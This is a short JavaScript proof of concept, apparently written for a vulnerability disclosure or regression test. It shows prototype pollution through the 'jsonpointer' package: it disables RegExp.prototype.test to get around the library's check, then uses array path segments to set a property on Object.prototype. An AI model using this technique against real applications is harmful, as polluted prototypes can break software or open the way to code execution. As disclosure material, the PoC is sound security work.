RegExp.prototype.test = () => false;
const jsonpointer = require('jsonpointer');
console.log({}.polluted);
jsonpointer.set({}, [
    ['proto'],
    ['constructor.prototype'],
    'polluted'
], 'yes');
console.log({}.polluted);